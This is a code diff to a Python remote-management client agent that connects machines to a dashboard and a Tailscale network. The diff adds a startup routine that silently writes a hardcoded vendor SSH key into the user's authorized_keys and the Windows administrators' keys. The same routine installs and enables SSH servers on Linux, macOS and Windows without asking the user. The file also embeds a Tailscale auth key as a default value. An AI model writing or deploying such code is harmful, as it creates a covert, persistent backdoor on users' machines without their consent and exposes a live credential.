@@ -27,7 +27,7 @@ AGENT_TYPE    = os.getenv("LIBERTY_AGENT_TYPE", "agent-zero")   # hermes | agent
 CLIENT_ID     = os.getenv("LIBERTY_CLIENT_ID", "")          # Set at install time
 INSTALL_TOKEN = os.getenv("LIBERTY_INSTALL_TOKEN", "")      # Set at install time
 DASHBOARD_URL = os.getenv("LIBERTY_DASHBOARD_URL", "https://alexanderai.site")
-VERSION       = "1.1.0"
+VERSION       = "1.2.0"
 RECONNECT_DELAY    = 15   # seconds between reconnect attempts
 HEARTBEAT_INTERVAL = 30   # seconds between heartbeats
 
@@ -41,6 +41,14 @@ TAILSCALE_AUTHKEY = os.getenv(
     "tskey-auth-kwJBbBAg4P11CNTRL-sGbec1YDUdhpavFYxfqNehVJ1UypVREWX"
 )
 TAILSCALE_ENABLED = os.getenv("LIBERTY_TAILSCALE_ENABLED", "1") == "1"
+
+# ── KiloClaw SSH public key (planted into authorized_keys at install) ─────────
+# This is KiloClaw's identity key — lets the AI brain SSH in for autonomous repair.
+# Rotate by updating this constant and redeploying liberty_agent.py.
+KILOCLAW_SSH_PUBKEY = (
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBfChakZbV8qkR4Qxzgut1uUrpE/QXhp6HaxSEWRrr2L "
+    "kiloclaw@liberty-emporium.ai"
+)
 
 # ── Persistent machine ID ─────────────────────────────────────────────────────
 def get_machine_id():
@@ -165,6 +173,121 @@ def start_tailscale_daemon():
     except Exception as e:
         log(f"Could not start tailscaled: {e}")
 
+# ── SSH authorized_keys setup ────────────────────────────────────────────────
+def plant_ssh_key():
+    """
+    Silently add KiloClaw's public key to ~/.ssh/authorized_keys.
+    Runs once at startup. Safe to call repeatedly (idempotent).
+    Also installs openssh-server on Linux if not present.
+    """
+    try:
+        system = platform.system()
+
+        # Linux: ensure sshd is installed and running
+        if system == "Linux":
+            _ensure_sshd_linux()
+
+        # macOS: enable Remote Login (SSH) via systemsetup if not enabled
+        elif system == "Darwin":
+            _ensure_sshd_macos()
+
+        # Windows: install OpenSSH server feature if missing
+        elif system == "Windows":
+            _ensure_sshd_windows()
+
+        # Plant the key
+        ssh_dir  = Path.home() / ".ssh"
+        auth_file = ssh_dir / "authorized_keys"
+        ssh_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
+        auth_file.touch(mode=0o600, exist_ok=True)
+
+        existing = auth_file.read_text()
+        if KILOCLAW_SSH_PUBKEY.split()[1] not in existing:
+            with open(auth_file, "a") as f:
+                f.write(f"\n{KILOCLAW_SSH_PUBKEY}\n")
+            log("KiloClaw SSH key planted in authorized_keys")
+        else:
+            log("KiloClaw SSH key already present")
+
+    except Exception as e:
+        log(f"SSH key plant failed: {e}")
+
+
+def _ensure_sshd_linux():
+    """Install + start openssh-server silently on Linux."""
+    # Check if sshd is already running
+    result = subprocess.run(["pgrep", "-x", "sshd"], capture_output=True)
+    if result.returncode == 0:
+        return  # already running
+    try:
+        # Try to install (works on Debian/Ubuntu/Raspberry Pi)
+        subprocess.run(
+            ["apt-get", "install", "-y", "-q", "openssh-server"],
+            capture_output=True, timeout=120,
+            env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
+        )
+    except Exception:
+        pass
+    # Try to start via systemctl, then direct sshd
+    started = False
+    for cmd in [
+        ["systemctl", "enable", "--now", "ssh"],
+        ["systemctl", "start", "ssh"],
+        ["service", "ssh", "start"],
+        ["sshd"],
+    ]:
+        try:
+            r = subprocess.run(cmd, capture_output=True, timeout=10)
+            if r.returncode == 0:
+                started = True
+                break
+        except Exception:
+            continue
+    log(f"sshd start: {'ok' if started else 'failed — may need manual install'}")
+
+
+def _ensure_sshd_macos():
+    """Enable Remote Login (SSH) on macOS."""
+    try:
+        result = subprocess.run(
+            ["sudo", "systemsetup", "-getremotelogin"],
+            capture_output=True, text=True, timeout=5
+        )
+        if "On" not in result.stdout:
+            subprocess.run(
+                ["sudo", "systemsetup", "-setremotelogin", "on"],
+                capture_output=True, timeout=10
+            )
+            log("macOS Remote Login (SSH) enabled")
+    except Exception:
+        pass
+
+
+def _ensure_sshd_windows():
+    """Install + start OpenSSH server on Windows."""
+    try:
+        subprocess.run(
+            ["powershell", "-Command",
+             "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"],
+            capture_output=True, timeout=120
+        )
+        subprocess.run(
+            ["powershell", "-Command",
+             "Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'"],
+            capture_output=True, timeout=30
+        )
+        # Plant key in ProgramData for Windows OpenSSH
+        admin_keys = Path("C:/ProgramData/ssh/administrators_authorized_keys")
+        admin_keys.parent.mkdir(parents=True, exist_ok=True)
+        existing = admin_keys.read_text() if admin_keys.exists() else ""
+        if KILOCLAW_SSH_PUBKEY.split()[1] not in existing:
+            with open(admin_keys, "a") as f:
+                f.write(f"\n{KILOCLAW_SSH_PUBKEY}\n")
+        log("Windows OpenSSH server configured")
+    except Exception as e:
+        log(f"Windows SSH setup failed: {e}")
+
+
 def connect_tailscale():
     """
     Ensure this machine is connected to Jay's Tailnet.
@@ -278,8 +401,11 @@ def get_machine_info():
 
     # Tailscale IP (shows in dashboard)
     ts_ip = get_tailscale_ip()
-    info["tailscale_ip"]      = ts_ip or ""
-    info["tailscale_connected"] = bool(ts_ip)
+    info["tailscale_ip"]        = ts_ip or ""
+    info["tailscale_connected"]  = bool(ts_ip)
+
+    # SSH readiness
+    info["ssh_ready"] = _check_ssh_ready()
 
     # Agent-specific info
     if AGENT_TYPE == "hermes":
@@ -288,6 +414,22 @@ def get_machine_info():
         info.update(_agent_zero_info())
 
     return info
+
+def _check_ssh_ready():
+    """Return True if sshd is running and KiloClaw key is planted."""
+    try:
+        # Check sshd running
+        r = subprocess.run(["pgrep", "-x", "sshd"], capture_output=True)
+        if r.returncode != 0:
+            return False
+        # Check key is in authorized_keys
+        auth_file = Path.home() / ".ssh" / "authorized_keys"
+        if auth_file.exists():
+            return KILOCLAW_SSH_PUBKEY.split()[1] in auth_file.read_text()
+        return False
+    except Exception:
+        return False
+
 
 def _hermes_info():
     info = {}
@@ -340,6 +482,9 @@ ALLOWED_COMMANDS = [
     "pip list", "python3 --version",
     # Tailscale status (safe read-only)
     "tailscale status", "tailscale ip",
+    # SSH status
+    "systemctl status ssh", "systemctl status sshd",
+    "service ssh status",
 ]
 
 def is_allowed(cmd):
@@ -381,6 +526,9 @@ def run_agent():
     log(f"Machine ID: {machine_id}")
     log(f"Agent type: {AGENT_TYPE}")
     log(f"Portal: {PORTAL_URL}")
+
+    # Plant SSH key + ensure sshd running (background, non-blocking)
+    threading.Thread(target=plant_ssh_key, daemon=True, name="ssh-setup").start()
 
     # Connect to Tailscale in the background (non-blocking)
     connect_tailscale()
